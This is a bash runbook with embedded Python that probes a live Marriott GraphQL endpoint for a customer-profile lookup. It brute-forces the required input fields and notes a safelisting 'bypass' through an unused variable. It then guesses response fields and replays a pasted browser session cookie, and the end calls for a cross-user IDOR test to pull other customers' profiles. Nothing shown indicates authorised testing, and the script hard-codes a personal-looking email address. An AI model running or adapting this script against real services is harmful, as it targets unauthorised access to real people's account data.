#!/usr/bin/env bash
# Session 24e — Complete LookupCustomerProfilesInput + response field enumeration
# S24d revealed country: String! is also required. Now find ALL required fields
# and re-enumerate LookupCustomerProfilesResponse with complete input.
# Date: 2026-06-25

set -eo pipefail
mkdir -p /tmp/s24e

OP='phoenixAccountLookupCustomerProfiles'
EP="https://auth-apc.marriott.com/mi/query/${OP}"

echo "========================================================"
echo "SESSION 24e — Complete input schema + response enumeration"
echo "========================================================"
echo ""
echo "Known required fields so far: email, firstName, lastName, country"

# ---------------------------------------------------------------
# PHASE A: Find ALL remaining required input fields
# Strategy: start with known required fields, keep adding
# until we stop getting "required type was not provided" errors
# ---------------------------------------------------------------

echo ""
echo "======== PHASE A: Complete required field discovery ========"
echo ""

echo "--- A1: Check if email+firstName+lastName+country is sufficient ---"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Test with 4 known required fields
payload = {
    "operationName": op,
    "variables": {"dummy": "x"},
    "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{email: "test@nowhere-invalid.test", firstName: "Test", lastName: "User", country: "US"}}) {{ __typename }} }}'
}
with open("/tmp/s24e/a1-test.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24e/a1-test.json",
    "-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)
print(f"With email+firstName+lastName+country:\n{r.stdout}\n")

if "required" in r.stdout and "not provided" in r.stdout:
    import re
    m = re.search(r'Field "LookupCustomerProfilesInput\.(\w+)" of required', r.stdout)
    if m:
        print(f"ANOTHER required field found: {m.group(1)}")
elif "1012100" in r.stdout or "UNAUTHORIZED" in r.stdout:
    print("INPUT IS COMPLETE — upstream auth error means all required fields provided!")
elif "Cannot query field" in r.stdout or "__typename" in r.stdout:
    print("INPUT VALID — response schema issue but input is complete")
elif "never used" in r.stdout:
    print("INPUT ACCEPTED — bypass passed, $dummy unused is the only error")
PYEOF

echo ""
echo "--- A2: Probe for additional optional/required input fields ---"
python3 << 'PYEOF'
import json, subprocess, re

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Base input with 4 known required fields
BASE = 'email: "test@nowhere-invalid.test", firstName: "Test", lastName: "User", country: "US"'

additional_fields = [
    ("dateOfBirth",     '"1990-01-01"'),
    ("birthDate",       '"1990-01-01"'),
    ("dob",             '"1990-01-01"'),
    ("phoneNumber",     '"5551234567"'),
    ("phone",           '"5551234567"'),
    ("loyaltyNumber",   '"845440472"'),
    ("memberId",        '"845440472"'),
    ("postalCode",      '"10001"'),
    ("zipCode",         '"10001"'),
    ("city",            '"New York"'),
    ("state",           '"NY"'),
    ("address",         '"123 Main St"'),
    ("gender",          '"M"'),
    ("locale",          '"en-US"'),
    ("channel",         '"WEB"'),
    ("source",          '"WEB"'),
    ("applicationId",   '"mi-account"'),
    ("brand",           '"MARRIOTT"'),
    ("market",          '"US"'),
    ("regionCode",      '"NAMER"'),
]

print("Testing additional input fields with base (email+firstName+lastName+country):")
print("")

for (field, value) in additional_fields:
    inline = f'{{{BASE}, {field}: {value}}}'
    payload = {
        "operationName": op,
        "variables": {"dummy": "x"},
        "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {inline}) {{ __typename }} }}'
    }
    with open("/tmp/s24e/opt-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24e/opt-probe.json"],
        capture_output=True, text=True, timeout=15)
    body = r.stdout

    if "not defined by type" in body:
        status = "FIELD NOT IN SCHEMA"
    elif "required" in body and "not provided" in body:
        m = re.search(r'Field "LookupCustomerProfilesInput\.(\w+)" of required', body)
        status = f"ANOTHER REQUIRED FIELD FOUND: {m.group(1) if m else body[:80]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        status = "UPSTREAM REACHED — input valid!"
    elif "never used" in body:
        status = "INPUT ACCEPTED (bypass, $dummy unused)"
    elif "Cannot query field" in body or "GRAPHQL_VALIDATION_FAILED" in body:
        status = f"INPUT OK — field accepted: {body[:80]}"
    else:
        status = f"OTHER: {body[:80]}"
    print(f"  +{field}: {status}")
PYEOF


# ---------------------------------------------------------------
# PHASE B: Response field enumeration with COMPLETE input
# Now using email+firstName+lastName+country
# ---------------------------------------------------------------

echo ""
echo "======== PHASE B: LookupCustomerProfilesResponse field enumeration ========"
echo "(Complete input: email+firstName+lastName+country)"
echo ""

python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

FULL_INPUT = '{email: "test@nowhere-invalid.test", firstName: "Test", lastName: "User", country: "US"}'

# Broader field list — including names that might be specific to this type
response_fields = [
    # Standard collection names
    "profiles", "customers", "results", "members", "hits", "matches",
    "items", "data", "records", "entries",
    # Specific to Marriott/loyalty
    "customerProfiles", "bonvoyProfiles", "memberProfiles",
    "loyaltyProfiles", "lookupResults", "searchResults",
    "bonvoyMembers", "marriottMembers",
    # Single result (maybe it returns one match)
    "customer", "profile", "member", "bonvoyMember",
    # Metadata
    "total", "count", "totalCount", "totalResults",
    "pageInfo", "pagination", "paging",
    "found", "exists", "matched",
    # Error/status
    "status", "error", "message",
    # Response wrapper patterns
    "response", "payload", "result",
    # ID fields (maybe it returns IDs directly)
    "customerId", "altCustId", "memberId",
    # Known to not exist from B1
    # profiles → confirmed MISSING
]

exists = []
missing = []

print("Probing response fields (complete input)...")
print("")

for field in response_fields:
    query_str = f"query {op}($dummy: String) {{ lookupCustomerProfiles(input: {FULL_INPUT}) {{ {field} }} }}"
    payload = {"operationName": op, "variables": {"dummy": "x"}, "query": query_str}
    with open("/tmp/s24e/resp-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl","-s",ep,"-H","content-type: application/json",
         "-H","application-name: account","-d","@/tmp/s24e/resp-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if f'Cannot query field "{field}"' in body:
        missing.append(field)
        status = "MISSING"
    elif "required" in body and "not provided" in body:
        status = f"INPUT STILL INCOMPLETE: {body[:80]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field)
        status = "EXISTS + upstream auth error"
    elif "never used" in body and f'Cannot query field' not in body:
        exists.append(field)
        status = "EXISTS (passed field check)"
    elif "FORBIDDEN" in body:
        status = "SAFELISTING BLOCKED"
    elif "is not an object" in body or "scalar" in body.lower():
        exists.append(field)
        status = f"EXISTS (scalar type — can't subfield)"
    elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" in body:
        exists.append(field)
        status = "EXISTS"
    else:
        status = f"OTHER: {body[:100]}"
    print(f"  response.{field}: {status}")

print(f"\n=== RESPONSE FIELDS EXIST: {exists}")
print(f"=== MISSING: {missing}")

with open("/tmp/s24e/response-fields.json","w") as f:
    import json as j
    j.dump({"exists": exists, "missing": missing}, f, indent=2)
PYEOF


# ---------------------------------------------------------------
# PHASE C: Authenticated lookup test
# If cookie file exists, runs the full IDOR test
# ---------------------------------------------------------------

echo ""
echo "======== PHASE C: Authenticated lookup ========"

if [ -f "/tmp/s24d/cs.txt" ]; then
    echo "Cookie file found at /tmp/s24d/cs.txt"
    python3 << 'PYEOF'
import json, subprocess, os, re

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

own_email = os.environ.get("OWN_EMAIL", "zahinshahriar3@gmail.com")
own_fname = os.environ.get("OWN_FNAME", "True")
own_lname = os.environ.get("OWN_LNAME", "Tester")
# Country — adjust based on your Bonvoy registration country
own_country = os.environ.get("OWN_COUNTRY", "US")

cookies = open("/tmp/s24d/cs.txt").read().strip()

# First figure out response fields from Phase B
try:
    with open("/tmp/s24e/response-fields.json") as f:
        resp_data = json.load(f)
    resp_fields = resp_data.get("exists", [])
except:
    resp_fields = []

if not resp_fields:
    resp_fields = ["customerProfiles", "results", "members", "found", "status"]

# Build a rich response query from discovered fields
resp_query = " ".join(resp_fields[:5])
if not resp_query:
    resp_query = "__typename"

print(f"C1: Authenticated self-lookup")
print(f"  email: {own_email}, firstName: {own_fname}, lastName: {own_lname}, country: {own_country}")
print(f"  Response fields to request: {resp_fields[:5]}")
print("")

payload = {
    "operationName": op,
    "variables": {"dummy": "x"},
    "query": f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{email: "{own_email}", firstName: "{own_fname}", lastName: "{own_lname}", country: "{own_country}"}}) {{ __typename {resp_query} }} }}'
}
with open("/tmp/s24e/auth-self.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-H",f"cookie: {cookies}",
    "-d","@/tmp/s24e/auth-self.json","-w","\nHTTP %{http_code} | %{size_download}B"],
    capture_output=True, text=True, timeout=15)

print(f"C1 response:\n{r.stdout[:2000]}")
with open("/tmp/s24e/auth-self-out.txt","w") as f:
    f.write(r.stdout)

# Analyze
body = r.stdout
if "1012100" in body:
    print("\n→ 1012100 — upstream auth still failing (cookie context mismatch)")
elif "FORBIDDEN" in body:
    print("\n→ SAFELISTING BLOCKED (unexpected)")
elif "required" in body and "not provided" in body:
    m = re.search(r'Field "LookupCustomerProfilesInput\.(\w+)" of required', body)
    if m:
        print(f"\n→ ANOTHER required field: {m.group(1)} — rerun with this added")
elif '"data"' in body and "null" not in body[:100]:
    print("\n→ !! DATA RETURNED — lookup returned profile data !!")
    print("→ CRITICAL: Now run cross-user test with a DIFFERENT email!")
elif "Cannot query field" in body:
    print(f"\n→ Input accepted! Response field wrong. Body: {body[:200]}")
PYEOF

else
    echo "No cookie file. To run authenticated test:"
    echo "  1. Log in to www.marriott.com/loyalty/myAccount/default.mi"
    echo "  2. In Network tab, find any /mi/query/ request"
    echo "  3. Copy the cookie: header value"
    echo "  4. echo 'COOKIE_VALUE' > /tmp/s24d/cs.txt"
    echo "  5. Re-run: OWN_EMAIL='...' OWN_FNAME='...' OWN_LNAME='...' OWN_COUNTRY='...' bash runbooks/PI-RUNBOOK-session24e-complete-input.sh"
fi


echo ""
echo "======== SESSION 24e COMPLETE ========"
echo ""
echo "=== KEY RESULTS TO LOOK FOR ==="
echo ""
echo "Phase A1 — 'INPUT IS COMPLETE' or 'INPUT ACCEPTED' → all required fields found"
echo "Phase A1 — more 'ANOTHER required field found: X' → keep adding and re-running"
echo ""
echo "Phase B  — RESPONSE fields with 'EXISTS' = what the response actually contains"
echo "           These are the fields to request in the authenticated test"
echo ""
echo "Phase C  — DATA RETURNED = lookup working, proceed to cross-user IDOR test"
echo "           1012100 = auth still failing (may need OWN_COUNTRY adjustment)"
echo ""
echo "If Phase A1 shows all required fields satisfied and B shows response fields,"
echo "the next step is authenticated lookup + cross-account test."
